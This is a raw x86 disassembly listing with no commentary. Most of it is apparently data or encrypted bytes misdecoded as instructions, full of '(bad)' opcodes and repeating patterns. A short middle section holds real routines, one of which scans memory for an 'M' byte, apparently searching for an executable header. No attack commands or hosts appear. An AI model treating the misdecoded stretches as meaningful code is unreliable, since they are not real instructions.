  404f00:	sub    al,0x12
  404f02:	leave  
  404f03:	push   edi
  404f04:	sub    al,BYTE PTR [ecx+0x5c]
  404f07:	sti    
  404f08:	push   ecx
  404f09:	les    edx,FWORD PTR [ecx+0x4e811100]
  404f0f:	inc    di
  404f11:	dec    edi
  404f12:	mov    edi,0x94c3ac67
  404f17:	xchg   edi,eax
  404f18:	icebp  
  404f19:	in     al,dx
  404f1a:	inc    edx
  404f1b:	rcl    BYTE PTR [edx+0x6240a2b4],1
  404f21:	pop    eax
  404f22:	inc    ecx
  404f23:	add    eax,0x40404340
  404f28:	inc    ebx
  404f29:	inc    eax
  404f2a:	test   BYTE PTR [eax],al
  404f2c:	add    eax,0x40624041
  404f31:	inc    eax
  404f32:	add    BYTE PTR [edx+0x5],ah
  404f35:	inc    ebx
  404f36:	add    BYTE PTR [eax+0x78],al
  404f39:	inc    ecx
  404f3a:	add    BYTE PTR [eax+0x41],bl
  404f3d:	bound  eax,QWORD PTR ds:0x808b87e0
  404f43:	push   edi
  404f44:	or     eax,0x483fb102
  404f49:	and    al,0x52
  404f4b:	(bad)  
  404f4c:	retf   
  404f4d:	dec    ebx
  404f4e:	inc    esp
  404f4f:	aaa    
  404f50:	shl    BYTE PTR [edx+0x41],0xf0
  404f54:	mov    al,ds:0xcc008440
  404f59:	bound  eax,QWORD PTR ds:0xcc840f41
  404f5f:	inc    ebx
  404f60:	add    BYTE PTR [eax+0x0],al
  404f63:	inc    eax
  404f64:	inc    eax
  404f65:	inc    eax
  404f66:	int3   
  404f67:	add    BYTE PTR ds:0x62404341,al
  404f6d:	pop    eax
  404f6e:	add    BYTE PTR [ebx+0x40],al
  404f71:	bound  ecx,QWORD PTR [edi]
  404f73:	inc    eax
  404f74:	adc    edx,DWORD PTR [ecx+0x4d]
  404f77:	fs enter 0x983c,0x47
  404f7c:	lds    ebx,FWORD PTR [edx-0x9]
  404f7f:	cmp    al,0x44
  404f81:	js     0x404fe6
  404f83:	pop    eax
  404f84:	mov    dl,BYTE PTR [ecx+0x4d]
  404f87:	test   al,0x3d
  404f89:	add    ebp,ecx
  404f8b:	shl    BYTE PTR [ebx-0x718b00a9],0xa8
  404f92:	sub    al,0xa0
  404f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f95:	ror    DWORD PTR [ebp+0x2a],1
  404f98:	test   al,0x11
  404f9a:	std    
  404f9b:	add    eax,0x42ffbfc5
  404fa0:	inc    eax
  404fa1:	mov    esp,0x3ddbcb62
  404fa6:	jno    0x405011
  404fa8:	inc    eax
  404fa9:	inc    ecx
  404faa:	mov    al,0x40
  404fac:	inc    eax
  404fad:	xchg   ecx,eax
  404fae:	add    BYTE PTR [eax],al
  404fb0:	inc    eax
  404fb1:	inc    eax
  404fb2:	cmovno eax,DWORD PTR ds:0x40056243
  404fb9:	int3   
  404fba:	add    ah,cl
  404fbc:	inc    eax
  404fbd:	inc    eax
  404fbe:	bound  eax,QWORD PTR [ecx+0x0]
  404fc1:	add    BYTE PTR [edi],cl
  404fc3:	inc    ebx
  404fc4:	inc    eax
  404fc5:	inc    eax
  404fc6:	add    BYTE PTR [ecx+0x43],al
  404fc9:	add    eax,0x40256240
  404fce:	bound  eax,QWORD PTR [eax]
  404fd0:	test   DWORD PTR [eax-0x9d97bf],0x5c4e4160
  404fda:	inc    esp
  404fdb:	hlt    
  404fdc:	in     eax,dx
  404fdd:	addr16 inc eax
  404fdf:	rcr    DWORD PTR [edi+0x4c6328d9],cl
  404fe5:	dec    esp
  404fe6:	inc    eax
  404fe7:	bound  edx,QWORD PTR [esi-0x23]
  404fea:	adc    BYTE PTR [edx+0x30],cl
  404fed:	add    eax,0x4140cc00
  404ff2:	inc    eax
  404ff3:	inc    ebx
  404ff4:	bound  esp,QWORD PTR ds:0x41400043
  404ffa:	add    BYTE PTR [eax],al
  404ffc:	add    eax,0x43624062
  405001:	inc    ecx
  405002:	inc    eax
  405003:	inc    eax
  405004:	inc    eax
  405005:	add    eax,0x40624340
  40500a:	add    eax,0x40664140
  40500f:	test   al,0x40
  405011:	xor    edx,DWORD PTR [ebx+0x41c0982b]
  405017:	inc    eax
  405018:	push   eax
  405019:	adc    al,0x57
  40501b:	add    al,0x5
  40501d:	(bad)  [eax+0x11b5402a]
  405023:	imul   eax,DWORD PTR [edi+0x40],0x3f
  405027:	inc    eax
  405028:	inc    eax
  405029:	add    BYTE PTR [eax-0x43],al
  40502c:	inc    ebx
  40502d:	add    BYTE PTR ds:0x41107840,al
  405033:	bound  eax,QWORD PTR [eax+0x40]
  405036:	sldt   WORD PTR [eax-0x34]
  40503a:	js     0x40509e
  40503c:	add    eax,0x40664143
  405041:	inc    ebx
  405042:	add    BYTE PTR [ecx+0x5],al
  405045:	js     0x405087
  405047:	bound  eax,QWORD PTR [eax+0x0]
  40504a:	inc    eax
  40504b:	inc    esi
  40504c:	dec    ebx
  40504d:	push   edx
  40504e:	add    DWORD PTR [eax-0xb],eax
  405051:	push   eax
  405052:	inc    esp
  405053:	xor    dh,bh
  405055:	bound  edx,QWORD PTR [eax]
  405057:	push   eax
  405058:	inc    edx
  405059:	mov    edi,0x7c12d665
  40505e:	pop    eax
  40505f:	inc    eax
  405060:	sar    BYTE PTR [ecx+0x1],1
  405063:	les    esi,FWORD PTR [eax]
  405065:	clc    
  405066:	sub    BYTE PTR [eax+0x21],al
  405069:	push   esi
  40506a:	test   al,0x4f
  40506c:	pop    ebx
  40506d:	bound  eax,QWORD PTR [esi+0x40]
  405070:	dec    edi
  405071:	adc    DWORD PTR [eax],edx
  405073:	retf   0xf23
  405076:	mov    ds:0x2a569d10,eax
  40507b:	sub    esi,DWORD PTR [eax]
  40507d:	xor    BYTE PTR [eax+eax*2],0xbd
  405081:	fwait
  405082:	pop    edi
  405083:	cwde   
  405084:	arpl   cx,dx
  405086:	push   0x43414f40
  40508b:	inc    eax
  40508c:	inc    eax
  40508d:	add    eax,0x434162
  405092:	inc    eax
  405093:	add    BYTE PTR [edx+0x5],ah
  405096:	inc    eax
  405097:	adc    BYTE PTR [edx+0x40],ah
  40509a:	inc    ebx
  40509b:	inc    ecx
  40509c:	add    eax,0x4340
  4050a1:	add    eax,0x404162
  4050a6:	add    BYTE PTR [eax+0x43],al
  4050a9:	inc    eax
  4050aa:	add    eax,0x41055224
  4050af:	and    al,0xab
  4050b1:	inc    eax
  4050b2:	lahf   
  4050b3:	xor    DWORD PTR [eax-0x37],esp
  4050b6:	cmp    al,0xd8
  4050b8:	in     al,dx
  4050b9:	adc    BYTE PTR [ebp+0x5a],bh
  4050bc:	xor    al,0xbf
  4050be:	dec    ebx
  4050bf:	(bad)  
  4050c0:	inc    BYTE PTR [eax-0x4d]
  4050c3:	sar    BYTE PTR [ebp-0x78d59f41],1
  4050c9:	inc    eax
  4050ca:	lds    ebp,FWORD PTR [ebx*4-0x3a93e8d8]
  4050d1:	inc    ecx
  4050d2:	push   ebp
  4050d3:	and    edi,DWORD PTR [ebx]
  4050d5:	fnop   
  4050d7:	arpl   WORD PTR [ebp+0x7ef25fd0],ax
  4050dd:	test   al,0x40
  4050df:	add    BYTE PTR [eax],al
  4050e1:	inc    ecx
  4050e2:	inc    ebx
  4050e3:	add    eax,0x41784062
  4050e8:	inc    eax
  4050e9:	inc    eax
  4050ea:	add    BYTE PTR [edi],cl
  4050ec:	bound  eax,QWORD PTR [ebx+0x0]
  4050ef:	add    eax,0x25006240
  4050f4:	inc    eax
  4050f5:	add    eax,0x40254143
  4050fa:	add    eax,0x68620000
  4050ff:	jp     0x405131
  405101:	inc    eax
  405102:	xchg   edx,eax
  405103:	jp     0x405168
  405105:	xchg   edx,eax
  405106:	stc    
  405107:	test   al,0xb0
  405109:	inc    eax
  40510a:	and    edi,DWORD PTR [edx]
  40510c:	mov    edi,0x624030bf
  405111:	inc    eax
  405112:	ret    
  405113:	add    BYTE PTR [edi+eax*2],dh
  405116:	inc    ecx
  405117:	sub    al,ah
  405119:	inc    eax
  40511a:	test   BYTE PTR [ebx+0x0],0x0
  40511e:	add    BYTE PTR [ecx+0x40],al
  405121:	bound  esp,QWORD PTR [esi+0x0]
  405124:	inc    eax
  405125:	add    eax,0x5400000
  40512a:	inc    ecx
  40512b:	inc    eax
  40512c:	inc    eax
  40512d:	bound  esp,QWORD PTR ds:0x25050043
  405133:	inc    ecx
  405134:	inc    ebx
  405135:	inc    eax
  405136:	test   BYTE PTR [eax+0x0],al
  405139:	bound  ebx,QWORD PTR [eax+0x62]
  40513c:	inc    ecx
  40513d:	inc    eax
  40513e:	xor    DWORD PTR [edx+0x11],esp
  405141:	fdivr  DWORD PTR [edi+0x432c404f]
  405147:	inc    esp
  405148:	mov    esp,0xd1402ae3
  40514d:	sbb    eax,0xe16253d0
  405152:	dec    eax
  405153:	mov    al,0x40
  405155:	push   ebx
  405156:	sub    DWORD PTR [ecx],esi
  405158:	jle    0x40516d
  40515a:	sub    bh,BYTE PTR ds:0x8ef8b540
  405160:	sub    dl,bl
  405162:	sub    eax,ebx
  405164:	adc    BYTE PTR [edx+0x40],ah
  405167:	inc    ecx
  405168:	and    eax,0x40000500
  40516d:	inc    ebx
  40516e:	add    eax,0x40624041
  405173:	inc    ebx
  405174:	add    eax,0x43402541
  405179:	bound  eax,QWORD PTR [eax+0x43]
  40517c:	int3   
  40517d:	inc    eax
  40517e:	bound  eax,QWORD PTR [eax]
  405180:	inc    ecx
  405181:	inc    eax
  405182:	inc    eax
  405183:	add    eax,0xb1574005
  405188:	std    
  405189:	pop    ecx
  40518a:	mov    eax,0x953fb036
  40518f:	and    al,0xa8
  405191:	mov    dh,0x6e
  405193:	inc    ebp
  405194:	add    eax,0x317d5b40
  405199:	test   al,0x81
  40519b:	dec    eax
  40519c:	leave  
  40519d:	inc    eax
  40519e:	xchg   ebx,eax
  40519f:	push   esp
  4051a0:	out    dx,eax
  4051a1:	inc    ecx
  4051a2:	(bad)  
  4051a4:	dec    esp
  4051a5:	inc    eax
  4051a6:	imul   ebx,edi,0x62
  4051a9:	sub    dl,BYTE PTR [eax-0xac3b8cc]
  4051af:	dec    esi
  4051b0:	dec    esp
  4051b1:	inc    eax
  4051b2:	test   al,0x62
  4051b4:	inc    eax
  4051b5:	and    eax,0x5406600
  4051ba:	inc    ebx
  4051bb:	inc    ecx
  4051bc:	inc    eax
  4051bd:	inc    eax
  4051be:	inc    ebx
  4051bf:	add    BYTE PTR [eax],al
  4051c1:	add    BYTE PTR [edx-0x34],ah
  4051c4:	inc    eax
  4051c5:	add    eax,0x40004041
  4051ca:	inc    ecx
  4051cb:	int3   
  4051cc:	add    BYTE PTR [ebx-0x7c],al
  4051cf:	add    eax,0x5406240
  4051d4:	bound  esp,QWORD PTR [edx+0x3e]
  4051d7:	inc    eax
  4051d8:	inc    edx
  4051d9:	xor    al,0x35
  4051db:	inc    eax
  4051dc:	test   eax,0xd340d4f8
  4051e1:	imul   esi,eax,0x7cc32b42
  4051e7:	inc    eax
  4051e8:	inc    ebx
  4051e9:	sahf   
  4051ea:	adc    dh,bh
  4051ec:	pop    ebx
  4051ed:	inc    eax
  4051ee:	test   al,0x2e
  4051f0:	jno    0x40525b
  4051f2:	bound  eax,QWORD PTR [esi-0x31]
  4051f5:	inc    eax
  4051f6:	adc    DWORD PTR [eax+0x40],eax
  4051f9:	mov    bl,0x3e
  4051fb:	inc    edx
  4051fc:	cmp    eax,0x12404807
  405201:	int    0xac
  405203:	sub    al,0x4
  405205:	dec    BYTE PTR ds:0x63550940
  40520b:	inc    eax
  40520c:	bound  ebx,QWORD PTR [eax+0x41]
  40520f:	add    eax,0x40404340
  405214:	inc    ebx
  405215:	inc    eax
  405216:	test   BYTE PTR [eax],al
  405218:	add    eax,0x40624041
  40521d:	inc    eax
  40521e:	add    BYTE PTR [edx+0x5],ah
  405221:	inc    ebx
  405222:	add    BYTE PTR [eax+0x78],al
  405225:	inc    ecx
  405226:	add    BYTE PTR [eax+0x41],bl
  405229:	bound  eax,QWORD PTR [esp+ebx*8-0x58]
  40522d:	inc    edx
  40522e:	add    al,0x44
  405230:	jmp    0x4051f7
  405232:	inc    edx
  405233:	push   eax
  405234:	inc    esp
  405235:	jae    0x405277
  405237:	shl    dl,1
  405239:	cwde   
  40523a:	sub    eax,0x4030d4df
  40523f:	mov    ebp,0x89bc6568
  405244:	test   BYTE PTR [eax+eax*2+0xf],dl
  405248:	dec    ebp
  405249:	push   eax
  40524a:	sbb    BYTE PTR [edx+0x60],cl
  40524d:	sub    BYTE PTR [eax+0x42],al
  405250:	pop    edi
  405251:	or     eax,0xf3790c71
  405256:	xlat   BYTE PTR ds:[ebx]
  405257:	ror    BYTE PTR [ebp-0x35],1
  40525a:	shr    BYTE PTR [ebx+0x40],cl
  40525d:	test   BYTE PTR [eax],al
  40525f:	int3   
  405260:	bound  eax,QWORD PTR ds:0xcc840f41
  405266:	inc    ebx
  405267:	add    BYTE PTR [eax+0x0],al
  40526a:	inc    eax
  40526b:	inc    eax
  40526c:	inc    eax
  40526d:	int3   
  40526e:	add    BYTE PTR ds:0x62404341,al
  405274:	pop    eax
  405275:	add    BYTE PTR [ebx+0x40],al
  405278:	bound  ecx,QWORD PTR [edi]
  40527a:	inc    eax
  40527b:	(bad)  [edx+0x4f5f42a2]
  405281:	bound  edi,QWORD PTR [ebp+0x7a]
  405284:	(bad)  
  405285:	out    0xdf,eax
  405287:	inc    eax
  405288:	inc    ecx
  405289:	inc    esp
  40528a:	gs and bh,ah
  40528d:	xor    eax,0x38295373
  405292:	xor    eax,0x422d9807
  405297:	push   esi
  405298:	cmp    al,0x8b
  40529a:	arpl   sp,bp
  40529c:	dec    esi
  40529d:	mov    ss,esp
  40529f:	pop    edi
  4052a0:	or     ebp,DWORD PTR [ebx]
  4052a2:	xor    eax,0x2818c6f
  4052a7:	scas   eax,DWORD PTR es:[edi]
  4052a8:	int3   
  4052a9:	cmp    eax,0x40000048
  4052ae:	inc    eax
  4052af:	cmovno eax,DWORD PTR ds:0x40056243
  4052b6:	int3   
  4052b7:	add    ah,cl
  4052b9:	inc    eax
  4052ba:	inc    eax
  4052bb:	bound  eax,QWORD PTR [ecx+0x0]
  4052be:	add    BYTE PTR [edi],cl
  4052c0:	inc    ebx
  4052c1:	inc    eax
  4052c2:	inc    eax
  4052c3:	add    BYTE PTR [ecx+0x43],al
  4052c6:	add    eax,0x40256240
  4052cb:	bound  eax,QWORD PTR [eax]
  4052cd:	inc    edi
  4052ce:	pop    esp
  4052cf:	ja     0x405311
  4052d1:	jecxz  0x405265
  4052d3:	push   esp
  4052d4:	std    
  4052d5:	xor    BYTE PTR [edx+edx*2],ch
  4052d8:	nop
  4052d9:	cmp    ebp,DWORD PTR [eax+0x686c6a52]
  4052df:	aam    0x17
  4052e1:	and    dl,BYTE PTR [eax]
  4052e3:	sub    eax,0x640a245b
  4052e8:	sub    bh,ch
  4052ea:	inc    esp
  4052eb:	scas   eax,DWORD PTR es:[edi]
  4052ec:	fadd   QWORD PTR [eax]
  4052ee:	test   eax,0x4a43412a
  4052f3:	mov    esp,0x96a44986
  4052f8:	lock mov edi,0x2adc6504
  4052fe:	test   DWORD PTR ds:0x4140cc00,0x25624340
  405308:	inc    ebx
  405309:	add    BYTE PTR [eax+0x41],al
  40530c:	add    BYTE PTR [eax],al
  40530e:	add    eax,0x43624062
  405313:	inc    ecx
  405314:	inc    eax
  405315:	inc    eax
  405316:	inc    eax
  405317:	add    eax,0x40624340
  40531c:	add    eax,0x40664140
  405321:	fst    DWORD PTR [edx]
  405323:	and    ecx,ebx
  405325:	cs inc ecx
  405327:	es scas eax,DWORD PTR es:[edi]
  405329:	outs   dx,DWORD PTR ds:[esi]
  40532a:	cs pop edi
  40532c:	mov    ah,0xcb
  40532e:	pop    eax
  40532f:	packsswb mm0,mm3
  405332:	mov    al,0x7a
  405334:	adc    eax,0x54953449
  405339:	sub    edx,DWORD PTR [edi+edi*1]
  40533c:	retf   
  40533d:	in     eax,0x3c
  40533f:	arpl   di,si
  405341:	aas    
  405342:	inc    edx
  405343:	cmp    al,BYTE PTR [ebx+0x0]
  405346:	add    eax,0x41107840
  40534b:	bound  eax,QWORD PTR [eax+0x40]
  40534e:	sldt   WORD PTR [eax-0x34]
  405352:	js     0x4053b6
  405354:	add    eax,0x40664143
  405359:	inc    ebx
  40535a:	add    BYTE PTR [ecx+0x5],al
  40535d:	js     0x40539f
  40535f:	bound  eax,QWORD PTR [eax+0x0]
  405362:	inc    eax
  405363:	inc    edx
  405364:	imul   esp,DWORD PTR [ecx+eax*2-0x53],0xa17f7069
  40536c:	in     al,0x97
  40536e:	ja     0x4053d2
  405370:	push   0x62813642
  405375:	nop
  405376:	jmp    0x7fbfc2e9
  40537b:	dec    edx
  40537c:	adc    al,0x41
  40537e:	inc    ebx
  40537f:	inc    eax
  405380:	inc    eax
  405381:	add    eax,0x434162
  405386:	inc    eax
  405387:	add    BYTE PTR [edx+0x5],ah
  40538a:	inc    eax
  40538b:	adc    BYTE PTR [edx+0x40],ah
  40538e:	inc    ebx
  40538f:	inc    ecx
  405390:	add    eax,0x4340
  405395:	add    eax,0xcc404162
  40539a:	int3   
  40539b:	int3   
  40539c:	int3   
  40539d:	int3   
  40539e:	int3   
  40539f:	int3   
  4053a0:	mov    eax,DWORD PTR [edi]
  4053a2:	push   ecx
  4053a3:	mov    ecx,eax
  4053a5:	dec    eax
  4053a6:	call   0x41cee0
  4053ab:	dec    edx
  4053ac:	je     0x4053b3
  4053ae:	pop    ecx
  4053af:	mov    eax,edx
  4053b1:	inc    edi
  4053b2:	ret    
  4053b3:	sub    esi,ebx
  4053b5:	mov    edx,ebx
  4053b7:	jmp    0x4053ae
  4053b9:	int3   
  4053ba:	int3   
  4053bb:	int3   
  4053bc:	int3   
  4053bd:	int3   
  4053be:	int3   
  4053bf:	int3   
  4053c0:	push   ebp
  4053c1:	mov    ebp,esp
  4053c3:	sub    esp,0x10
  4053c6:	mov    edx,DWORD PTR ds:0x426cb4
  4053cc:	mov    eax,DWORD PTR [ebp+0x8]
  4053cf:	call   0x414c70
  4053d4:	sub    eax,edx
  4053d6:	mov    ecx,DWORD PTR [eax]
  4053d8:	cmp    cl,0x4d
  4053db:	jne    0x4053d4
  4053dd:	push   ebx
  4053de:	call   0x405450
  4053e3:	inc    ecx
  4053e4:	push   esi
  4053e5:	push   edi
  4053e6:	inc    ecx
  4053e7:	cmp    WORD PTR [eax],cx
  4053ea:	jne    0x405443
  4053ec:	call   0x41cf70
  4053f1:	xor    edx,edx
  4053f3:	mov    ebx,DWORD PTR [ebp+0xc]
  4053f6:	mov    ecx,edx
  4053f8:	dec    ebx
  4053f9:	call   0x401160
  4053fe:	dec    ecx
  4053ff:	mov    DWORD PTR [ebp-0x10],ecx
  405402:	xor    eax,eax
  405404:	mov    DWORD PTR [ebp-0x8],eax
  405407:	mov    ecx,DWORD PTR [edi]
  405409:	dec    ecx
  40540a:	add    ecx,DWORD PTR [ebp-0x4]
  40540d:	call   0x413940
  405412:	cmp    eax,ebx
  405414:	jne    0x40541f
  405416:	call   0x41cec0
  40541b:	test   eax,eax
  40541d:	je     0x405430
  40541f:	inc    edi
  405420:	inc    edi
  405421:	inc    DWORD PTR [ebp-0x8]
  405424:	inc    edi
  405425:	inc    edi
  405426:	mov    eax,DWORD PTR [ebp-0x8]
  405429:	mov    ecx,DWORD PTR [ebp-0xc]
  40542c:	cmp    eax,ecx
  40542e:	jb     0x405407
  405430:	mov    eax,DWORD PTR [ebp-0x8]
  405433:	mov    ecx,DWORD PTR [ebp-0xc]
  405436:	cmp    eax,ecx
  405438:	jae    0x405443
  40543a:	call   0x419570
  40543f:	add    eax,ecx
  405441:	jmp    0x405445
  405443:	xor    eax,eax
  405445:	pop    edi
  405446:	pop    esi
  405447:	pop    ebx
  405448:	leave  
  405449:	ret    0x8
  40544c:	int3   
  40544d:	int3   
  40544e:	int3   
  40544f:	int3   
  405450:	mov    ecx,eax
  405452:	mov    DWORD PTR [ebp-0x4],ecx
  405455:	mov    ecx,DWORD PTR [ecx+0x3a]
  405458:	shr    ecx,0x10
  40545b:	add    eax,ecx
  40545d:	mov    ecx,0x109
  405462:	add    eax,0x19
  405465:	dec    eax
  405466:	ret    
  405467:	int3   
  405468:	int3   
  405469:	int3   
  40546a:	int3   
  40546b:	int3   
  40546c:	int3   
  40546d:	int3   
  40546e:	int3   
  40546f:	int3   
  405470:	add    BYTE PTR [eax],al
  405472:	inc    eax
  405473:	inc    ebx
  405474:	inc    eax
  405475:	add    eax,0xe13c6253
  40547a:	jb     0x40549f
  40547c:	inc    esp
  40547d:	loopne 0x405439
  40547f:	mov    edi,0x3f42d94c
  405484:	int3   
  405485:	mov    ah,0xa0
  405487:	or     eax,0xbf71c14b
  40548c:	adc    BYTE PTR [edi-0x783e3234],cl
  405492:	in     eax,dx
  405493:	dec    ebp
  405494:	dec    eax
  405495:	dec    ebp
  405496:	sub    BYTE PTR [ecx+0x52],ah
  405499:	mov    al,BYTE PTR [ecx+0x13]
  40549c:	adc    esp,DWORD PTR [edx+0x52]
  40549f:	inc    ecx
  4054a0:	dec    ebx
  4054a1:	sar    BYTE PTR es:[esi-0xa],1
  4054a5:	inc    edx
  4054a6:	mov    al,0xc2
  4054a8:	shl    DWORD PTR [esi+ecx*1-0x4d],0x73
  4054ad:	inc    eax
  4054ae:	add    BYTE PTR [eax],al
  4054b0:	inc    ecx
  4054b1:	inc    ebx
  4054b2:	add    eax,0x41784062
  4054b7:	inc    eax
  4054b8:	inc    eax
  4054b9:	add    BYTE PTR [edi],cl
  4054bb:	bound  eax,QWORD PTR [ebx+0x0]
  4054be:	add    eax,0x25006240
  4054c3:	inc    eax
  4054c4:	add    eax,0x40254143
  4054c9:	add    eax,0xb2620000
  4054ce:	mov    edx,0x40aee30c
  4054d3:	pop    esp
  4054d4:	inc    eax
  4054d5:	les    esp,FWORD PTR [ecx]
  4054d7:	arpl   WORD PTR [eax-0x1aaff65c],bx
  4054dd:	dec    edi
  4054de:	pop    esp
  4054df:	inc    esp
  4054e0:	pusha  
  4054e1:	cli    
  4054e2:	and    DWORD PTR [edi],eax
  4054e4:	addr16 inc eax
  4054e6:	xchg   esp,eax
  4054e7:	adc    al,0xac
  4054e9:	lods   al,BYTE PTR ds:[esi]
  4054ea:	xor    BYTE PTR [ebp+0x56],cl
  4054ed:	nop
  4054ee:	pop    ss
  4054ef:	mov    eax,ds:0xd00d2dc3
  4054f4:	inc    eax
  4054f5:	inc    ebx
  4054f6:	jnp    0x40554b
  4054f8:	out    dx,eax
  4054f9:	sbb    DWORD PTR [eax+0x10],eax
  4054fc:	in     eax,0x43
  4054fe:	add    BYTE PTR [eax],al
  405500:	add    BYTE PTR [ecx+0x40],al
  405503:	bound  esp,QWORD PTR [esi+0x0]
  405506:	inc    eax
  405507:	add    eax,0x5400000
  40550c:	inc    ecx
  40550d:	inc    eax
  40550e:	inc    eax
  40550f:	bound  esp,QWORD PTR ds:0x25050043
  405515:	inc    ecx
  405516:	inc    ebx
  405517:	inc    eax
  405518:	test   BYTE PTR [eax+0x0],al
  40551b:	bound  ebx,QWORD PTR [eax+0x62]
  40551e:	inc    ecx
  40551f:	inc    eax
  405520:	cmp    al,0xa8
  405522:	and    BYTE PTR [edi],bh
  405524:	fs pop ds
  405526:	lds    esp,FWORD PTR [edi-0x5c]
  405529:	adc    ch,BYTE PTR [eax-0x2137f81d]
  40552f:	inc    ebx
  405530:	arpl   WORD PTR [ecx-0x5a],ax
  405533:	cmp    BYTE PTR [ebx+0x10911040],ah
  405539:	bound  eax,QWORD PTR [eax+0x41]
  40553c:	and    eax,0x40000500
  405541:	inc    ebx
  405542:	add    eax,0x40624041
  405547:	inc    ebx
  405548:	add    eax,0x43402541
  40554d:	bound  eax,QWORD PTR [eax+0x43]
  405550:	int3   
  405551:	inc    eax
  405552:	bound  eax,QWORD PTR [eax]
  405554:	inc    ecx
  405555:	inc    eax
  405556:	inc    eax
  405557:	add    eax,0x46bbbc05
  40555c:	inc    ecx
  40555d:	xlat   BYTE PTR ds:[ebx]
  40555e:	shr    BYTE PTR [edx+0x622cc42b],1
  405564:	hlt    
  405565:	loope  0x40556a
  405567:	cmp    al,0x45
  405569:	dec    edi
  40556a:	adc    bh,ah
  40556c:	push   0x23360e0a
  405571:	push   esp
  405572:	dec    esp
  405573:	xor    al,0xae
  405575:	das    
  405576:	rcr    BYTE PTR [ecx],1
  405578:	stc    
  405579:	daa    
  40557a:	int    0x52
  40557c:	leave  
  40557d:	xchg   ebx,eax
  40557e:	push   ss
  40557f:	or     al,0x5e
  405581:	inc    ecx
  405582:	mov    al,ch
  405584:	call   0x6600:0x25406254
  40558b:	inc    eax
  40558c:	add    eax,0x40404143
  405591:	inc    ebx
  405592:	add    BYTE PTR [eax],al
  405594:	add    BYTE PTR [edx-0x34],ah
  405597:	inc    eax
  405598:	add    eax,0x40004041
  40559d:	inc    ecx
  40559e:	int3   
  40559f:	add    BYTE PTR [ebx-0x7c],al
  4055a2:	add    eax,0x5406240
  4055a7:	bound  esp,QWORD PTR [eax]
  4055a9:	sti    
  4055aa:	cmp    eax,ebx
  4055ac:	cmovg  ebp,DWORD PTR [ebx-0x7abf6fd2]
  4055b3:	dec    esi
  4055b4:	pop    edx
  4055b5:	xchg   edx,eax
  4055b6:	inc    esp
  4055b7:	add    eax,DWORD PTR ds:0xefcfac50
  4055bd:	lds    edx,FWORD PTR [ebp-0x19]
  4055c0:	fs ja  0x405615
  4055c3:	test   al,0xd0
  4055c5:	inc    eax
  4055c6:	bound  ebx,QWORD PTR [eax+0x41]
  4055c9:	add    eax,0x40404340
  4055ce:	inc    ebx
  4055cf:	inc    eax
  4055d0:	test   BYTE PTR [eax],al
  4055d2:	add    eax,0x40624041
  4055d7:	inc    eax
  4055d8:	add    BYTE PTR [edx+0x5],ah
  4055db:	inc    ebx
  4055dc:	add    BYTE PTR [eax+0x78],al
  4055df:	inc    ecx
  4055e0:	add    BYTE PTR [eax+0x41],bl
  4055e3:	bound  eax,QWORD PTR [ecx-0x31]
  4055e6:	dec    esp
  4055e7:	adc    BYTE PTR [eax+ebx*2],cl
  4055ea:	gs mov al,0x98
  4055ed:	jbe    0x40561b
  4055ef:	gs stc 
  4055f1:	adc    bh,0xd
  4055f4:	add    BYTE PTR [eax-0x3c2f150f],ch
  4055fa:	(bad)  
  4055fb:	retf   
  4055fc:	arpl   WORD PTR [ecx],dx
  4055fe:	test   DWORD PTR [eax+0x3f],edx
  405601:	mov    eax,0x444d7952
  405606:	dec    esp
  405607:	ror    BYTE PTR [esi],1
  405609:	adc    eax,0x902d4134
  40560e:	bound  esi,QWORD PTR [ecx+0x55]
  405611:	inc    eax
  405612:	test   BYTE PTR [eax],al
  405614:	int3   
  405615:	bound  eax,QWORD PTR ds:0xcc840f41
  40561b:	inc    ebx
  40561c:	add    BYTE PTR [eax+0x0],al
  40561f:	inc    eax
  405620:	inc    eax
  405621:	inc    eax
  405622:	int3   
  405623:	add    BYTE PTR ds:0x62404341,al
  405629:	pop    eax
  40562a:	add    BYTE PTR [ebx+0x40],al
  40562d:	bound  ecx,QWORD PTR [edi]
  40562f:	inc    eax
  405630:	retf   
  405631:	inc    ecx
  405632:	call   0x1df7:0x4fa40c35
  405639:	sub    al,0xec
  40563b:	jns    0x405608
  40563d:	or     eax,0x583445d2
  405642:	sub    al,0xc3
  405644:	dec    eax
  405645:	bound  edi,QWORD PTR [edx-0x29]
  405648:	inc    ebp
  405649:	into   
  40564a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40564b:	mov    ah,0x45
  40564d:	inc    eax
  40564e:	inc    edi
  40564f:	mov    DWORD PTR [ebp-0x58],0xfdf38490
  405656:	xchg   ecx,eax
  405657:	fbld   TBYTE PTR [esp+eiz*2+0x4204f3a8]
  40565e:	inc    edx
  40565f:	add    BYTE PTR [eax],al
  405661:	inc    eax
  405662:	inc    eax
  405663:	cmovno eax,DWORD PTR ds:0x40056243
  40566a:	int3   
  40566b:	add    ah,cl
  40566d:	inc    eax
  40566e:	inc    eax
  40566f:	bound  eax,QWORD PTR [ecx+0x0]
  405672:	add    BYTE PTR [edi],cl
  405674:	inc    ebx
  405675:	inc    eax
  405676:	inc    eax
  405677:	add    BYTE PTR [ecx+0x43],al
  40567a:	add    eax,0x40256240
  40567f:	bound  eax,QWORD PTR [eax]
  405681:	pop    es
  405682:	add    BYTE PTR [edi-0x199cbca7],cl
  405688:	rcl    DWORD PTR [eax-0x53d19d58],1
  40568e:	push   ebp
  40568f:	fisttp WORD PTR [ecx+edi*2+0x11]
  405693:	dec    eax
  405694:	mov    al,0x5
  405696:	xor    eax,DWORD PTR ds:0x4140cc00
  40569c:	inc    eax
  40569d:	inc    ebx
  40569e:	bound  esp,QWORD PTR ds:0x41400043
  4056a4:	add    BYTE PTR [eax],al
  4056a6:	add    eax,0x43624062
  4056ab:	inc    ecx
  4056ac:	inc    eax
  4056ad:	inc    eax
  4056ae:	inc    eax
  4056af:	add    eax,0x40624340
  4056b4:	add    eax,0x40664140
  4056b9:	adc    ebx,0x40
  4056bc:	inc    esp
  4056bd:	dec    ebx
  4056be:	mov    esi,edi
  4056c0:	dec    esp
  4056c1:	jne    0x40573c
  4056c3:	ja     0x405715
  4056c5:	sub    eax,0xde0d6f0d
  4056ca:	xor    bh,al
  4056cc:	or     al,0x62
  4056ce:	bound  esp,QWORD PTR [edx+0x7b]
  4056d1:	(bad)  
  4056d2:	out    dx,eax
  4056d3:	sbb    DWORD PTR [ebx+0x4a],eax
  4056d6:	imul   esp,DWORD PTR [edx-0x44],0xffffffbb
  4056da:	sub    DWORD PTR [ebx],ecx
  4056dc:	inc    ebx
